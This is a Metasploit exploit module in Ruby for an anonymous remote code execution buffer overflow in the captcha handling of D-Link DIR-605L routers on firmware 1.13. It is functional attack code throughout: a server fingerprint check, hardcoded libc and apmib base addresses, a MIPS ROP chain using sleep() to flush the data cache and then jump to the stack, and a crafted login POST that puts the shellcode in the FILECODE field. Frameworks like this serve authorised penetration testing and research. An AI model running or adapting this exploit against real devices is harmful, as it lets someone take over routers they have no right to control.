# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # Because only has been tested on a QEMU emulated environment

  HttpFingerprint = { :pattern => [ /Boa/ ] }

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link DIR-605L Captcha Handling Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an anonymous remote code execution on D-Link DIR-605L routers. The
        vulnerability exists while handling user supplied captcha information, and is due to the
        insecure usage of sprintf on the getAuthCode() function. This module has been tested
        successfully on DLink DIR-605L Firmware 1.13 under a QEMU environment.
      },
      &#039;Author&#039;         =>
        [
          &#039;Craig Heffner&#039;, # Vulnerability discovery, original exploit
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 3000,
          &#039;BadChars&#039;    => "\x00\x67\x26\x2b"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_MIPSBE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;86824&#039; ],
          [ &#039;URL&#039;, &#039;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&#039; ]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;DLink DIR-605L 1.13&#039;,
            {
              &#039;Offset&#039;      => 94,
              &#039;LibcBase&#039;    => 0x2ab86000, # According to Original Exploit by Craig Heffner
              &#039;ApmibBase&#039;   => 0x2aaef000, # According to Original Exploit by Craig Heffner
              #&#039;LibcBase&#039;    => 0x4212e000, # QEMU environment
              #&#039;ApmibBase&#039;   => 0x42095000, # QEMU environment
              #LOAD:000248D4  li      $a0, 1   ; set $a0 for the sleep() call
              #LOAD:000248D8  move    $t9, $s1 ; $s1 is controlled after the overflow
              #LOAD:000248DC  jalr    $t9
              &#039;Ret&#039;         => 0x248D4, # from libc
              #LOAD:0002B954  move    $t9, $s2 # Controlled
              #LOAD:0002B958  lw      $ra, 0x30+var_4($sp)  # allows to get controlled $ra from the stack
              #LOAD:0002B95C  lw      $s4, 0x30+var_8($sp)
              #LOAD:0002B960  lw      $s3, 0x30+var_C($sp)
              #LOAD:0002B964  lw      $s2, 0x30+var_10($sp)
              #LOAD:0002B968  lw      $s1, 0x30+var_14($sp) # allows to get controlled $s1 from the stack
              #LOAD:0002B96C  lw      $s0, 0x30+var_18($sp)
              #LOAD:0002B970  jr      $t9
              &#039;RopJmpSleep&#039; => 0x2B954, # from libc
              &#039;RopSleep&#039;    => 0x23D30, # from libc # Sleep Function Address # sleep() to flush the data cache
              #LOAD:000027E8  move    $t9, $s1 # Controlled
              #LOAD:000027EC  jalr    $t9 ; sub_22D0
              #LOAD:000027F0  addiu   $a2, $sp, 0x40+var_24 ; put pointer to the stack on $a2 # executed because of pipelining
              &#039;RopPtrStack&#039; => 0x027E8, # from apmi
              #LOAD:00001D78  move    $t9, $a2 ; $a2 contains a poiner to the stack
              #LOAD:00001D7C  jalr    $t9
              &#039;RopJmpStack&#039; => 0x01D78 # from apmi
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 08 2012&#039;,
      &#039;DefaultTarget&#039; => 0))

  end

  def check
    res = send_request_cgi({ &#039;uri&#039; => &#039;/comm.asp&#039; })
    if res and res.code == 200 and res.body =~ /var modelname="DIR-605L"/ and res.headers["Server"] and res.headers["Server"] =~ /Boa\/0\.94\.14rc21/
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit

    shellcode = ""
    shellcode << rand_text(target[&#039;Offset&#039;])                             # Padding
    shellcode << rand_text(4)                                            # $s0
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;RopJmpSleep&#039;]].pack("N")  # $s1
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;RopSleep&#039;]].pack("N")     # $s2
    shellcode << rand_text(4)                                            # $s3
    shellcode << [target[&#039;LibcBase&#039;] + target.ret].pack("N")             # $ra
    shellcode << rand_text(0x1c)                                         # filler
    shellcode << rand_text(4)                                            # $s0
    shellcode << [target[&#039;ApmibBase&#039;] + target[&#039;RopJmpStack&#039;]].pack("N") # $s1
    shellcode << rand_text(4)                                            # $s2
    shellcode << rand_text(4)                                            # $s3
    shellcode << rand_text(4)                                            # $s4
    shellcode << [target[&#039;ApmibBase&#039;] + target[&#039;RopPtrStack&#039;]].pack("N") # $ra
    shellcode << rand_text(0x1c)                                         # filler
    shellcode << payload.encoded                                         # shellcode

    print_status("#{peer} - Sending exploit...")

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => "/goform/formLogin",
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039; => {
        &#039;VERIFICATION_CODE&#039; => &#039;myvoiceismypassportverifyme&#039;,
        &#039;VER_CODE&#039;          => &#039;1234&#039;,
        &#039;login_n&#039;           => &#039;admin&#039;,
        &#039;FILECODE&#039;          =>  shellcode,
        &#039;curTime&#039;           => &#039;1348588030496&#039;,
        &#039;login_pass&#039;        => &#039;Zm9vb255b3UA&#039;,
        &#039;login_name&#039;        => &#039;admin&#039;
      }
    })

  end

end

